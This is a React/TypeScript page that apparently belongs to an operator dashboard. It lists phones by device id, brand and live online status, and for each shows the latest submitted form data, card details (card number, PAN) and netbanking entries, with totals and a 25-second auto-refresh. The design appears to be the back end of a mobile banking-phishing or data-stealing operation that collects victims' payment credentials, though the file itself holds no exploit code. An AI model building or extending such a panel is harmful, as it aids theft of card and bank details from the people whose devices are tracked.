// src/pages/FormsPaymentsPage.tsx
import { useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { getDevices } from "../services/api/devices";

import pageBg from "../assets/login-bg.png";

type ViewKey = "summary" | "forms_latest" | "card_latest" | "net_latest";

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

/* ===== DevicesPage-like pickers ===== */
function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

/* ===== Form helpers ===== */
type AnyObj = Record<string, any>;

function pickFormDeviceId(s: AnyObj): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || s?.payload?.uniqueid || "");
}

function pickFormTs(s: AnyObj): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;

  const created = safeStr(s?.createdAt || s?.created_at || s?.date || s?.time || "");
  if (created) {
    const t = Date.parse(created);
    if (Number.isFinite(t)) return t;
  }
  return 0;
}

function summarizeForm(s: AnyObj | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";

  const candidates: Array<[string, any]> = [
    ["name", s.name || s.fullName || s.payload?.name || s.payload?.fullName],
    ["mobile", s.mobile || s.phone || s.payload?.mobile || s.payload?.phone],
    ["amount", s.amount || s.amt || s.payload?.amount || s.payload?.amt],
    ["upi", s.upi || s.upiId || s.payload?.upi || s.payload?.upiId],
    ["bank", s.bank || s.bankName || s.payload?.bank || s.payload?.bankName],
    ["title", s.title || s.formTitle || s.payload?.title || s.payload?.formTitle],
  ];

  const parts: string[] = [];
  for (const [k, raw] of candidates) {
    const v = safeStr(raw);
    if (!v) continue;
    parts.push(`${k}: ${v}`);
    if (parts.length >= 3) break;
  }

  const ts = pickFormTs(s);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Form submitted";
}

/* ===== Payments helpers ===== */
function pickAnyTs(x: any): number {
  const t = x?.timestamp ?? x?.time ?? x?.createdAt ?? x?.created_at ?? x?.date ?? x?.ts ?? x?.updatedAt;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function isEmptyVal(v: any): boolean {
  if (v === null || v === undefined) return true;
  if (typeof v === "string") {
    const s = v.trim();
    if (!s) return true;
    const l = s.toLowerCase();
    if (l === "null" || l === "undefined") return true;
    return false;
  }
  if (typeof v === "number") return !Number.isFinite(v);
  if (typeof v === "boolean") return false;
  if (Array.isArray(v)) return v.length === 0;
  if (typeof v === "object") return Object.keys(v).length === 0;
  return false;
}

function humanLabel(key: string): string {
  return key
    .replace(/_/g, " ")
    .replace(/([a-z])([A-Z])/g, "$1 $2")
    .trim()
    .replace(/\b\w/g, (m) => m.toUpperCase());
}

function buildPairs(obj: any, max = 10): Array<{ label: string; value: string }> {
  if (!obj || typeof obj !== "object") return [];
  const keys = Object.keys(obj);

  const out: Array<{ label: string; value: string }> = [];
  for (const k of keys) {
    const v = obj?.[k];

    if (typeof v === "object" && v !== null) {
      if (Array.isArray(v)) {
        const prim = v
          .filter((x) => ["string", "number", "boolean"].includes(typeof x))
          .map((x) => safeStr(x))
          .filter((x) => !isEmptyVal(x));
        const joined = prim.join(", ");
        if (!isEmptyVal(joined)) out.push({ label: humanLabel(k), value: joined });
      }
      continue;
    }

    if (isEmptyVal(v)) continue;
    const s = safeStr(v);
    if (!s) continue;

    out.push({ label: humanLabel(k), value: s });
    if (out.length >= max) break;
  }
  return out;
}

function niceMoney(v: any): string {
  const n = Number(v);
  if (!Number.isFinite(n)) return safeStr(v);
  try {
    return n.toLocaleString(undefined, { maximumFractionDigits: 2 });
  } catch {
    return String(n);
  }
}

function paymentSummary(p: any): string {
  const amt = p?.amount ?? p?.amt ?? p?.price ?? p?.total ?? p?.sum;
  const bank = p?.bank ?? p?.bankName ?? p?.provider;
  const upi = p?.upi ?? p?.upiId ?? p?.vpa;
  const card = p?.card ?? p?.cardNumber ?? p?.pan ?? p?.maskedPan;

  const parts: string[] = [];
  if (!isEmptyVal(amt)) parts.push(`₹ ${niceMoney(amt)}`);
  if (!isEmptyVal(upi)) parts.push(`upi: ${safeStr(upi)}`);
  if (!isEmptyVal(bank)) parts.push(`bank: ${safeStr(bank)}`);
  if (!isEmptyVal(card)) parts.push(`card: ${safeStr(card)}`);

  const ts = pickAnyTs(p);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Payment";
}

/* ===== small async pool to avoid too many parallel calls ===== */
async function asyncPool<T, R>(poolLimit: number, array: T[], iteratorFn: (item: T) => Promise<R>): Promise<R[]> {
  const ret: R[] = [];
  const executing: Promise<void>[] = [];

  for (const item of array) {
    const p = (async () => {
      const r = await iteratorFn(item);
      ret.push(r);
    })();

    executing.push(p);

    if (executing.length >= poolLimit) {
      await Promise.race(executing);
      for (let i = executing.length - 1; i >= 0; i--) {
        // eslint-disable-next-line @typescript-eslint/no-floating-promises
        executing[i].then(() => {});
      }
      await Promise.resolve();
      executing.splice(0, Math.max(0, executing.length - poolLimit + 1));
    }
  }

  await Promise.all(executing);
  return ret;
}

/* ===== UI ===== */
function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
      </div>

      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />

      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 border-l-2 border-t-2 border-cyan-200/50 rounded-tl-[10px]" />
      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 border-r-2 border-t-2 border-cyan-200/50 rounded-tr-[10px]" />
      <div className="pointer-events-none absolute left-3 bottom-3 h-6 w-6 border-l-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />
      <div className="pointer-events-none absolute right-3 bottom-3 h-6 w-6 border-r-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />

      <div
        className={[
          "relative rounded-[26px] px-4 py-4",
          "bg-white/[0.055]",
          "border border-white/[0.16]",
          "backdrop-blur-3xl backdrop-saturate-[1.6]",
          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
        ].join(" ")}
      >
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
          style={{
            backgroundImage:
              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
          }}
        />
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
          style={{
            backgroundImage:
              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
          }}
        />
        <div className="relative">{children}</div>
      </div>
    </div>
  );
}

type DeviceMeta = {
  deviceId: string;
  brand: string;
  model: string;
  online: boolean;
  displayNumber: number;
};

export default function FormsPaymentsPage() {
  const nav = useNavigate();

  const [view, setView] = useState<ViewKey>("summary");

  const [devicesMeta, setDevicesMeta] = useState<DeviceMeta[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [totalForms, setTotalForms] = useState<number | null>(null);
  const [totalCards, setTotalCards] = useState<number | null>(null);
  const [totalNet, setTotalNet] = useState<number | null>(null);

  const [latestFormMap, setLatestFormMap] = useState<Record<string, AnyObj>>({});
  const [latestCardMap, setLatestCardMap] = useState<Record<string, AnyObj>>({});
  const [latestNetMap, setLatestNetMap] = useState<Record<string, AnyObj>>({});

  const [cardCountMap, setCardCountMap] = useState<Record<string, number>>({});
  const [netCountMap, setNetCountMap] = useState<Record<string, number>>({});

  const [q, setQ] = useState("");
  const [expanded, setExpanded] = useState<string | null>(null);

  const [refreshTick, setRefreshTick] = useState(0);
  const loadedOnceRef = useRef(false);

  async function loadAll() {
    setLoading(true);
    setError(null);

    try {
      const devList = await getDevices();
      const arr = Array.isArray(devList) ? devList : [];

      const normalized = arr
        .map((d: any) => {
          const id = pickDeviceId(d) || "unknown";
          return {
            deviceId: id,
            brand: pickBrand(d),
            model: pickModel(d),
            online: !!d?.status?.online,
          };
        })
        .reverse();

      const total = normalized.length;
      const metaArr: DeviceMeta[] = normalized.map((d, i) => ({
        ...d,
        displayNumber: total - i,
      }));

      setDevicesMeta(metaArr);

      const forms = await listFormSubmissions().catch(() => []);
      const formsArr = Array.isArray(forms) ? (forms as AnyObj[]) : [];
      setTotalForms(formsArr.length);

      const lForm: Record<string, AnyObj> = {};
      for (const s of formsArr) {
        const did = pickFormDeviceId(s);
        if (!did) continue;
        const ts = pickFormTs(s);
        const prev = lForm[did];
        if (!prev || ts > pickFormTs(prev)) lForm[did] = s;
      }
      setLatestFormMap(lForm);

      const ids = metaArr.map((d) => d.deviceId).filter(Boolean);

      const cardCounts: Record<string, number> = {};
      const netCounts: Record<string, number> = {};
      const lCard: Record<string, AnyObj> = {};
      const lNet: Record<string, AnyObj> = {};
      let cardsTotal = 0;
      let netTotal = 0;

      await asyncPool(
        6,
        ids,
        async (id) => {
          const [cards, nets] = await Promise.all([
            getCardPaymentsByDevice(id).catch(() => []),
            getNetbankingByDevice(id).catch(() => []),
          ]);

          const cArr = Array.isArray(cards) ? (cards as AnyObj[]) : [];
          const nArr = Array.isArray(nets) ? (nets as AnyObj[]) : [];

          cardCounts[id] = cArr.length;
          netCounts[id] = nArr.length;

          cardsTotal += cArr.length;
          netTotal += nArr.length;

          if (cArr.length) {
            const latest = cArr.slice().sort((a, b) => pickAnyTs(b) - pickAnyTs(a))[0];
            if (latest) lCard[id] = latest;
          }
          if (nArr.length) {
            const latest = nArr.slice().sort((a, b) => pickAnyTs(b) - pickAnyTs(a))[0];
            if (latest) lNet[id] = latest;
          }

          return true;
        }
      );

      setCardCountMap(cardCounts);
      setNetCountMap(netCounts);
      setLatestCardMap(lCard);
      setLatestNetMap(lNet);

      setTotalCards(cardsTotal);
      setTotalNet(netTotal);

      loadedOnceRef.current = true;
    } catch (e) {
      console.error("FormsPaymentsPage loadAll failed", e);
      setError("Failed to load forms/payments");
      setDevicesMeta([]);
      setTotalForms(0);
      setTotalCards(0);
      setTotalNet(0);
      setLatestFormMap({});
      setLatestCardMap({});
      setLatestNetMap({});
      setCardCountMap({});
      setNetCountMap({});
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    loadAll();
    const id = setInterval(() => setRefreshTick((t) => t + 1), 25_000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (!loadedOnceRef.current) return;
    if (refreshTick <= 0) return;
    loadAll().catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [refreshTick]);

  const visibleDevices = useMemo(() => {
    let base = devicesMeta;

    if (view === "forms_latest") {
      base = base.filter((d) => !!latestFormMap[d.deviceId]);
    } else if (view === "card_latest") {
      base = base.filter((d) => (cardCountMap[d.deviceId] ?? 0) > 0 || !!latestCardMap[d.deviceId]);
    } else if (view === "net_latest") {
      base = base.filter((d) => (netCountMap[d.deviceId] ?? 0) > 0 || !!latestNetMap[d.deviceId]);
    }

    const qq = q.trim().toLowerCase();
    if (!qq) return base;

    return base.filter(
      (d) =>
        d.brand.toLowerCase().includes(qq) ||
        d.model.toLowerCase().includes(qq) ||
        d.deviceId.toLowerCase().includes(qq)
    );
  }, [devicesMeta, q, view, latestFormMap, latestCardMap, latestNetMap, cardCountMap, netCountMap]);

  function SectionHeader({
    title,
    subtitle,
    onBack,
    right,
  }: {
    title: string;
    subtitle?: string;
    onBack?: () => void;
    right?: ReactNode;
  }) {
    return (
      <div className="flex items-start justify-between gap-3">
        <div className="min-w-0">
          <div className="text-[18px] font-extrabold tracking-tight text-white">{title}</div>
          {subtitle ? <div className="text-[12px] text-white/60">{subtitle}</div> : null}
        </div>

        <div className="flex items-center gap-2 shrink-0">
          {right}
          {onBack ? (
            <button
              onClick={onBack}
              className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
              type="button"
            >
              Back
            </button>
          ) : null}
        </div>
      </div>
    );
  }

  function StatTile({
    title,
    value,
    icon,
    onClick,
  }: {
    title: string;
    value: string | number;
    icon: string;
    onClick: () => void;
  }) {
    return (
      <button
        type="button"
        onClick={onClick}
        className={[
          "w-full text-left",
          "rounded-[26px] p-4",
          "border border-white/14",
          "bg-white/[0.055]",
          "backdrop-blur-3xl",
          "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
          "active:scale-[0.995] transition",
          "overflow-hidden",
        ].join(" ")}
      >
        <div className="flex items-center justify-between gap-3">
          <div className="min-w-0">
            <div className="text-[12px] text-white/60">{title}</div>
            <div className="mt-1 text-[22px] font-extrabold text-white">{value}</div>
          </div>
          <div className="w-11 h-11 rounded-2xl border border-white/14 bg-white/[0.06] flex items-center justify-center text-xl">
            {icon}
          </div>
        </div>
        <div className="mt-2 text-[11px] text-white/45">Tap to view latest per device</div>
      </button>
    );
  }

  function DeviceRow({
    d,
    subtitle,
    detailsObj,
    countText,
    kind,
  }: {
    d: DeviceMeta;
    subtitle: string;
    detailsObj?: AnyObj | null;
    countText?: string;
    kind: "forms" | "card" | "net";
  }) {
    const isOpen = expanded === `${kind}:${d.deviceId}`;
    const online = d.online;

    const pairs = useMemo(() => {
      if (!detailsObj) return [];
      const source =
        kind === "forms" ? (detailsObj.payload && typeof detailsObj.payload === "object" ? detailsObj.payload : detailsObj) : detailsObj;
      return buildPairs(source, 10);
    }, [detailsObj, kind]);

    return (
      <button
        type="button"
        onClick={() => setExpanded(isOpen ? null : `${kind}:${d.deviceId}`)}
        className={[
          "w-full text-left relative",
          "rounded-[26px] p-4",
          "border border-white/14",
          "bg-white/[0.055]",
          "backdrop-blur-3xl backdrop-saturate-[1.6]",
          "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
          "overflow-hidden",
          "active:scale-[0.995] transition",
        ].join(" ")}
      >
        <div className="pointer-events-none absolute -inset-2 rounded-[28px] blur-2xl bg-cyan-400/10" />

        <div className="relative flex items-start justify-between gap-3">
          <div className="min-w-0">
            <div className="flex items-center gap-2 min-w-0">
              <div className="font-extrabold text-[16px] text-white truncate min-w-0">{d.brand}</div>

              <div
                className="flex items-center justify-center w-7 h-7 rounded-full text-sm font-extrabold
                           border border-white/14 bg-cyan-400/85 text-white shadow-[0_6px_18px_rgba(2,6,23,0.6)]
                           flex-shrink-0"
                title={`#${d.displayNumber}`}
              >
                {d.displayNumber}
              </div>
            </div>

            {d.model ? <div className="mt-1 text-[12px] text-white/60">{d.model}</div> : null}

            <div className="mt-2 text-[12px] text-white/85 whitespace-normal break-words">{subtitle}</div>

            {countText ? <div className="mt-1 text-[11px] text-white/45">{countText}</div> : null}
          </div>

          <div className="shrink-0 flex flex-col items-end gap-2">
            <span
              className={[
                "px-3 py-1 rounded-full text-[12px] font-extrabold border",
                online ? "bg-green-500/15 text-green-200 border-green-400/25" : "bg-red-500/15 text-red-200 border-red-400/25",
              ].join(" ")}
            >
              {online ? "Online" : "Offline"}
            </span>

            <div className="text-[12px] text-white/40">{isOpen ? "▲" : "▼"}</div>
          </div>
        </div>

        {isOpen ? (
          <div className="relative mt-3 rounded-2xl border border-white/12 bg-black/20 p-3">
            {pairs.length === 0 ? (
              <div className="text-[12px] text-white/55">No details.</div>
            ) : (
              <div className="grid grid-cols-1 gap-2">
                {pairs.map((p) => (
                  <div key={p.label} className="flex items-start justify-between gap-3">
                    <div className="text-[11px] text-white/55">{p.label}</div>
                    <div className="text-[11px] font-extrabold text-white/85 break-words text-right">{p.value}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ) : null}
      </button>
    );
  }

  const headerRight = (
    <>
      <button
        onClick={() => nav("/")}
        className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
        type="button"
      >
        Home
      </button>
      <button
        onClick={() => loadAll()}
        className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
        type="button"
        title="Refresh"
      >
        ↻
      </button>
    </>
  );

  const emptyText =
    view === "forms_latest"
      ? "No form submits found."
      : view === "card_latest"
      ? "No card submits found."
      : view === "net_latest"
      ? "No netbanking submits found."
      : "No devices.";

  return (
    <div className="relative w-full min-h-[100svh] overflow-x-hidden bg-black">
      <div className="absolute inset-0 bg-center bg-cover" style={{ backgroundImage: `url(${pageBg})` }} />
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />

      <div className="pointer-events-none absolute inset-0 opacity-35">
        <div className="absolute -top-24 left-1/2 h-[460px] w-[460px] -translate-x-1/2 rounded-full blur-3xl bg-cyan-400/16" />
        <div className="absolute top-[35%] left-[-120px] h-[360px] w-[360px] rounded-full blur-3xl bg-blue-400/10" />
        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full blur-3xl bg-cyan-300/12" />
      </div>

      <div className="relative w-full max-w-[420px] mx-auto px-3 pb-24 pt-4">
        <TechGlassCard>
          <SectionHeader title="Forms & Payments" subtitle="Totals + latest per device" right={headerRight} />

          {error ? (
            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
              {error}
            </div>
          ) : null}

          {view === "summary" ? (
            <div className="mt-4 space-y-3">
              <StatTile
                title="Total Form Submits"
                value={totalForms == null ? "…" : totalForms}
                icon="🧾"
                onClick={() => {
                  setExpanded(null);
                  setQ("");
                  setView("forms_latest");
                }}
              />
              <StatTile
                title="Card Submits"
                value={totalCards == null ? "…" : totalCards}
                icon="💳"
                onClick={() => {
                  setExpanded(null);
                  setQ("");
                  setView("card_latest");
                }}
              />
              <StatTile
                title="Netbanking Submits"
                value={totalNet == null ? "…" : totalNet}
                icon="🏦"
                onClick={() => {
                  setExpanded(null);
                  setQ("");
                  setView("net_latest");
                }}
              />

              {loading ? (
                <div className="mt-2 rounded-2xl border border-white/14 bg-white/[0.05] p-4 text-center text-white/70">
                  Loading…
                </div>
              ) : null}
            </div>
          ) : (
            <div className="mt-4">
              <div className="rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <div className="text-[14px] font-extrabold text-white">
                      {view === "forms_latest"
                        ? "Forms (Latest)"
                        : view === "card_latest"
                        ? "Card (Latest)"
                        : "Netbanking (Latest)"}
                    </div>
                    <div className="text-[12px] text-white/60 mt-1">
                      Sirf wahi devices jisme submit data available hai
                    </div>
                  </div>

                  <button
                    onClick={() => {
                      setExpanded(null);
                      setQ("");
                      setView("summary");
                    }}
                    className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
                    type="button"
                  >
                    Back
                  </button>
                </div>

                <div className="mt-3">
                  <input
                    value={q}
                    onChange={(e) => setQ(e.target.value)}
                    placeholder="Search brand / model / id"
                    className={[
                      "w-full h-11 rounded-2xl px-4 text-[14px]",
                      "text-white placeholder:text-white/35",
                      "bg-white/[0.06]",
                      "border border-white/[0.14]",
                      "backdrop-blur-2xl",
                      "outline-none",
                      "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
                    ].join(" ")}
                  />
                </div>
              </div>

              <div className="mt-4 space-y-3">
                {loading ? (
                  <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
                    Loading…
                  </div>
                ) : visibleDevices.length === 0 ? (
                  <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
                    {emptyText}
                  </div>
                ) : (
                  visibleDevices.map((d) => {
                    if (view === "forms_latest") {
                      const latest = latestFormMap[d.deviceId];
                      const subtitle = latest ? summarizeForm(latest) : "No form submit";
                      return (
                        <DeviceRow
                          key={`f_${d.deviceId}`}
                          d={d}
                          kind="forms"
                          subtitle={subtitle}
                          detailsObj={latest || null}
                        />
                      );
                    }

                    if (view === "card_latest") {
                      const latest = latestCardMap[d.deviceId];
                      const cnt = cardCountMap[d.deviceId] ?? 0;
                      const subtitle = latest ? paymentSummary(latest) : "No card payment";
                      return (
                        <DeviceRow
                          key={`c_${d.deviceId}`}
                          d={d}
                          kind="card"
                          subtitle={subtitle}
                          detailsObj={latest || null}
                          countText={`Total card submits: ${cnt}`}
                        />
                      );
                    }

                    const latest = latestNetMap[d.deviceId];
                    const cnt = netCountMap[d.deviceId] ?? 0;
                    const subtitle = latest ? paymentSummary(latest) : "No netbanking data";
                    return (
                      <DeviceRow
                        key={`n_${d.deviceId}`}
                        d={d}
                        kind="net"
                        subtitle={subtitle}
                        detailsObj={latest || null}
                        countText={`Total netbanking submits: ${cnt}`}
                      />
                    );
                  })
                )}
              </div>
            </div>
          )}
        </TechGlassCard>
      </div>
    </div>
  );
}